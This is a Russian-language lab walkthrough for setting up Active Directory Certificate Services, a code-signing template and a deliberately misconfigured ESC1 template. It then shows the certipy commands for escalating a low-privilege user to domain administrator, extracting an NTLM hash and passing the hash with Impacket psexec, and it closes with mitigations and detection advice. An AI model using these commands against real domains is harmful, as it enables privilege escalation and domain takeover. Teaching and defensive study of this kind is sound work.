## Стенд / введение

Для выполнения данного кейса необходимо скачать [**OVA-образ**](https://storage.ptsecurity.com/seafhttp/f/80469232779e4a3cb305/?op=view) виртуальной машины, заготовленной Positive Technologies. У данной виртуальной машины должен быть 1 сетевой адаптер VirtualBox в режиме bridge. Также понадобится **Debian**

К виртуальной машине можно подключиться с помощью графического интерфейса VirtualBox со следующими учётными данными:

**Windows Server VM:**

- Login - **Administrator**
   
   - Password - **Admin123**

**Цель практики:** развёртывание роли **Active Directory Certificate Services**, работа с шаблонами сертификатов и демонстрация атаки повышения привилегий **ESC1** через самостоятельное указание **SAN**

#### Развёртывание Active Directory Domain Services

Открываем **Server Manager**, выбираем **Add Roles and Features** и на шаге **Server Roles** отмечаем **Active Directory Domain Services**

![](../../_images/43b01d07a3c3.webp)

Дожидаемся установки роли и переходим к постустановочной настройке по ссылке **"Promote this server to a domain controller"** в уведомлениях **Server Manager**

![](../../_images/1b65f9435001.webp)

В мастере повышения выбираем **Add a new forest** и задаём корневое доменное имя **lab.local**

![](../../_images/9347b2938a38.webp)

На шаге **Domain Controller Options** оставляем **Forest functional level** и **Domain functional level** на предложенном по умолчанию значении, а также не трогаем отмеченные по умолчанию флажки **Domain Name System** (**DNS**) **server** и **Global Catalog** (**GC**) - оба нужны контроллеру домена, флажок **Read only domain controller** (**RODC**) остаётся не отмеченным. В полях **Password** и **Confirm password** задаём пароль режима восстановления служб каталогов (**DSRM**) - он используется только при аварийном восстановлении **AD** и в остальной практике не понадобится, но мастер не даст продолжить без него

![](../../_images/c994a9f089cd.jpg)

Оставшиеся шаги мастера проходим со значениями по умолчанию - **DNS**-делегирование пропускаем, **NetBIOS**-имя формируется автоматически - и завершаем установку нажатием **Install**. Сервер перезагружается и после перезагрузки становится контроллером домена **lab.local**

![](../../_images/2f3bb69b5d1d.jpg)

После перезагрузки на экране входа выбираем учётную запись **LAB\Administrator**

![](../../_images/39ca83d73f01.webp)

Домен развёрнут - можно переходить к установке роли **AD CS**

#### Установка роли Active Directory Certificate Services

На контроллере домена открываем **Server Manager**, выбираем **Add Roles and Features** и на шаге **Server Roles** отмечаем **Active Directory Certificate Services**

![](../../_images/946dfa317e39.jpg)

На шаге **Role Services** оставляем отмеченным **Certification Authority**

![](../../_images/4fe90c415fec.webp)

Дожидаемся завершения установки и переходим к постустановочной настройке - по ссылке **"Configure Active Directory Certificate Services on the destination server"** в уведомлениях **Server Manager**

![](../../_images/a110bbeae945.webp)

В мастере настройки выбираем **Certification Authority** на шаге **Role Services**

![](../../_images/98f139b78ed6.webp)

Затем оставляем тип **CA** - **Enterprise CA**, поскольку сертифицирующий центр должен быть интегрирован с **AD** и автоматически публиковать шаблоны в каталоге

![](../../_images/3310d5786c44.jpg)

На шаге **CA Type** оставляем **Root CA** - в стенде это единственный **CA**, вышестоящего для него нет. Дальше оставляем предложенные по умолчанию параметры и устанавливаем роль

![](../../_images/de94caaa9d24.webp)

После завершения мастера в дереве **Server Manager** появляется установленная роль, а на самом сервере становится доступна консоль **certsrv.msc**, с которой ведётся вся дальнейшая работа с шаблонами

![](../../_images/f90a3b64de70.webp)

#### Шаблон для подписи кода

Для начала подготовим пользователя student. Открываем **Active Directory Users and Computers** - **Win + R** и вводим: `dsa.msc`

![](../../_images/8cf43cf6aa30.webp)

Кликаем правой кнопкой по контейнеру **Users**, выбираем **New → User**

![](../../_images/2089624afdcf.webp)

Заполним имя и логин - **student**

![](../../_images/f6457fda2232.webp)

Задаём пароль учётной записи **P@ssword123** и снимаем флажок **"User must change password at next logon"**, чтобы пароль сразу был рабочим для последующих команд. После завершаем создание пользователя

![](../../_images/ddeca59b3e27.webp)

Так как на контроллере домена интерактивный вход разрешён только ограниченному набору групп, чтобы не подключать отдельную windows машину к домену, мы разрешим пользователю **student** вход. Для этого открываем **Group Policy Management** - **Win + R** и вводим `gpmc.msc`, разворачиваем домен **lab.local**, переходим в **Domain Controllers → Default Domain Controllers Policy**, кликаем правой кнопкой и выбираем **Edit**

![](../../_images/0f37259deebb.webp)

В редакторе групповой политики переходим в **Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → User Rights Assignment**, дважды кликаем по **Allow log on locally** и добавляем **student**

![](../../_images/d78d3da67d2c.webp)

Изменение групповой политики применяется не сразу - на контроллере домена выполняем: `gpupdate /force`.После выполнения команды дожидаемся завершения обновления перед тем, как пробовать войти под **LAB\student**

![](../../_images/9af4a04c3ff8.webp)

Теперь перейдем к шаблонам. Открываем консоль управления сертифицирующим центром - **Win + R** и вводим: `certsrv.msc`

![](../../_images/f7edf8de140d.webp)

В дереве слева разворачиваем сертифицирующий центр, переходим в **Certificate Templates**, кликаем правой кнопкой и выбираем **Manage** - открывается отдельная оснастка **Certificate Templates Console** со списком всех шаблонов, доступных этому **CA**

![](../../_images/1178b291214e.webp)

Встроенный шаблон **Code Signing** по умолчанию недоступен для рядовых пользователей домена, поэтому продублируем его, чтобы выдать право на запрос без изменения штатного шаблона. Кликаем правой кнопкой по **Code Signing** и выбираем **Duplicate Template**

![](../../_images/ef17d21ca8f8.webp)

На вкладке **General** меняем **Template display name** на **CodeSigning-Lab**

![](../../_images/853a2b2dcde5.webp)

На вкладке **Security** добавляем пользователя **student** и отмечаем разрешение **Enroll**

![](../../_images/7065cf6ce3c6.webp)

Сохраняем шаблон нажатием **OK**, возвращаемся в основное окно `certsrv.msc`, кликаем правой кнопкой по **Certificate Templates**, выбираем **New → Certificate Template to Issue**

![](../../_images/0ec4c142695e.webp)

Публикуем **CodeSigning-Lab**

![](../../_images/cd91c6c7da4f.jpg)

Настроим политику выполнения скриптов: `Set-ExecutionPolicy AllSigned -Scope LocalMachine -Force`

![](../../_images/c6eeddbcaaad.webp)

##### Получение сертификата и подпись скрипта

Переходим в пользователя **student**, и создаём простой тестовый скрипт **hello.ps1**:

```
Write-Host "Hello world!"
Pause
```

![](../../_images/b3a393104524.webp)

Пробуем запустить его как есть: `.\hello.ps1` - **PowerShell** откажется выполнять неподписанный скрипт, что и показывает, зачем в принципе нужна подпись кода

![](../../_images/faf3be5c55a3.webp)

Дальше запросим сертификат по созданному шаблону и подпишем скрипт полученным сертификатом. Все команды выполняются в **PowerShell** от имени пользователя **student**

| Задача | Команда |
|---|---|
| Запросить сертификат по шаблону CodeSigning-Lab | Get-Certificate -Template "CodeSigning-Lab" -CertStoreLocation Cert:\CurrentUser\My |
| Найти полученный сертификат в личном хранилище | $cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert |
| Подписать скрипт полученным сертификатом | Set-AuthenticodeSignature -FilePath .\hello.ps1 -Certificate $cert |

![](../../_images/9aa728c90cf2.webp)

> Запрос сертификата проходит без единого предупреждения - сертификат сразу оказывается в личном хранилище пользователя, поскольку **CA** доверяет шаблону **CodeSigning-Lab** и выдаёт по нему без одобрения администратора

Запускаем **hello.ps1** повторно - подпись действительна, но **PowerShell** всё равно переспрашивает: **"Do you want to run software from this untrusted publisher?"** Дело не в самой подписи, а в том, что издатель **(CN=student)** ещё не встречался этому сеансу **PowerShell** как доверенный - **AllSigned** требует валидную подпись, но не добавляет издателя в доверенные автоматически. Выбираем **[A] Always run**, чтобы подтвердить издателя один раз и не видеть этот запрос при повторных запусках

![](../../_images/f3c74744622c.webp)

На этом шаблоне видно, как должна работать инфраструктура сертификатов: **Subject Name** строится из **AD**, а не из ввода заявителя, и заявитель может получить только тот тип сертификата, для которого у него есть право **Enroll**. Дальше разберём, что происходит, если хотя бы один из этих принципов нарушен.

#### Подготовка уязвимого шаблона сертификата

Переходим в пользователя Administrator и открываем консоль управления сертифицирующим центром - **Win + R** и вводим: `certsrv.msc`

![](../../_images/f840d1fe2224.webp)

В дереве слева разворачиваем сертифицирующий центр, переходим в **Certificate Templates**, кликаем правой кнопкой и выбираем **Manage** - открывается отдельная оснастка **Certificate Templates Console** со списком всех шаблонов, доступных этому **CA**

![](../../_images/2f67082b45b9.webp)

Существующие штатные шаблоны трогать нежелательно, поэтому продублируем один из них - например, **User**. Кликаем правой кнопкой по выбранному шаблону и выбираем **Duplicate Template**

![](../../_images/2402576b21d2.webp)

На вкладке **General** меняем **Template display name** на **ESC1-Vulnerable**

![](../../_images/e9e5ba125805.webp)

Переходим на вкладку **Subject Name** и вместо варианта **"Build from this Active Directory information"** выбираем **"Supply in the request"**. Это самый чувствительный параметр во всём шаблоне: именно он определяет, может заявитель сам вписать в сертификат произвольное имя (в том числе **Subject Alternative Name**) или имя жёстко берётся из учётной записи в **AD**

![](../../_images/1f127adce38a.webp)

> Классическая ошибка: включение **"Supply in the request"** ради удобства процесса выдачи, без сопутствующего требования **Manager Approval** - то есть отключение единственной проверки, кто реально стоит за заявкой на сертификат.

На вкладке Security оставляем группу **Domain Users** и отмечаем разрешение **Enroll** - так шаблон становится доступен любому аутентифицированному пользователю домена, а не только узкой группе, которой сертификат нужен по задаче

![](../../_images/bd99a19ec018.webp)

На вкладке **Extensions** выбираем **Application Policies**, нажимаем **Edit**, и проверяем что есть **Client Authentication**. Этим полем определяется, что сертификат, выпущенный по шаблону, можно использовать для входа в домен, а не только для нейтральных целей вроде подписи кода

![](../../_images/43b63ba10089.webp)

Шаблон существует только в базе конфигурации **AD CS**, поэтому его нужно явно опубликовать, чтобы **CA** начал выдавать по нему сертификаты. Возвращаемся в основное окно **certsrv.msc**, кликаем правой кнопкой по **Certificate Templates**, выбираем **New → Certificate Template to Issue**

![](../../_images/27708f46e7ac.webp)

Находим в списке **ESC1-Vulnerable** и публикуем

![](../../_images/50e6e532d2b1.webp)

> С этого момента шаблон доступен для запроса любому пользователю домена, у которого есть право **Enroll** - то есть группе **Domain Users**, как было настроено на предыдущем шаге.

Настроенный таким образом шаблон выглядит как рядовая техническая деталь инфраструктуры, но именно сочетание трёх включённых параметров превращает его в готовый путь повышения привилегий - переходим к тому, как это выглядит с позиции атакующего.

#### Атака: ESC1 - кража личности через произвольный SAN

Для эксплуатации **ESC1** нужно одновременное совпадение четырёх условий: шаблон разрешает аутентификацию через **EKU Client Authentication**, заявка не требует одобрения менеджера, шаблон позволяет заявителю самому указать **SAN** (флаг **ENROLLEE_SUPPLIES_SUBJECT**, то есть настроенное выше **"Supply in the request"**), и у атакующего есть право **Enroll** по этому шаблону. Все четыре условия закрыты настройкой, сделанной в предыдущем разделе, поэтому шаблон **ESC1-Vulnerable** подходит для демонстрации без дополнительных изменений.

Для перечисления и эксплуатации используется **certipy-ad** - инструмент, который умеет находить уязвимые шаблоны по **LDAP** и напрямую обращаться к **CA** для запроса сертификатов. Все команды выполняются с атакующей машины на **Debian** от имени обычного пользователя домена, без каких-либо повышенных прав.

Узнаем **ip** адрес windows server: `ipconfig`

![](../../_images/222cd4f604d3.jpg)

Установим **certipy-ad**

```
apt install python3-pip -y
pip3 install certipy-ad --break-system-packages
```

![](../../_images/8567ccdd4f10.webp)

Найдем шаблоны, уязвимые к **ESC1** и другим **ESC**-атакам: `certipy find -u 'student@lab.local' -p 'P@ssword123' -dc-ip 192.168.0.188 -vulnerable -enabled`

![](../../_images/4cf5ba8f3912.webp)

Просмотрим файл - `cat 20260719075452_Certipy.txt` и найдем уязвимый шаблон

![](../../_images/daa295e16611.webp)

Запомним **CA Name** и **DNS Name** они нам понадобятся на следующем шагу

![](../../_images/bc9a1e394d72.webp)

Запросим сертификат от имени администратора домена: `certipy req -u 'student@lab.local' -p 'P@ssword123' -dc-ip 192.168.0.188 -ca 'lab-WIN-KVJ742S66HG-CA' -target 'WIN-KVJ742S66HG.lab.local' -template 'ESC1-Vulnerable' -upn 'administrator@lab.local'`

![](../../_images/01acdd566540.webp)

Пройдем аутентификацию полученным сертификатом и получим хеш: `certipy auth -pfx administrator.pfx -dc-ip 192.168.0.188`

![](../../_images/00a73e07b8cc.webp)

Используем полученный **NTLM-хеш** для доступа к контроллеру домена (**Pass-the-Hash**): `psexec.py lab.local/administrator@192.168.0.188 -hashes <LM_hash>:<NT_hash>`

> **psexec **- утилита из набора **Impacket**, предназначенная для удалённого выполнения команд на Windows-системах. Она имитирует функциональность оригинальной утилиты **PsExec** из пакета **Microsoft Sysinternals**

![](../../_images/88dea0988319.webp)

> Основная мера защиты - убрать возможность самостоятельно указывать **SAN**: на вкладке **Subject Name** переключить шаблон обратно на **"Build from this Active Directory information"**. Если по каким-то причинам это невозможно, единственная адекватная компенсация - включить **Manager Approval**, чтобы каждая заявка подтверждалась вручную, а не выдавалась автоматически. Право **Enroll** стоит выдавать не **Domain Users** и не всем аутентифицированным пользователям, а конкретной выделенной группе, которой сертификат действительно нужен по задаче. Дополнительно полезно включить мониторинг события **4886** (**Certificate Services received a certificate request**) и разбирать поле **SAN** в подозрительных заявках - совпадение **SAN** с именем привилегированной учётной записи при запросе от обычного пользователя домена является прямым признаком эксплуатации **ESC1**.
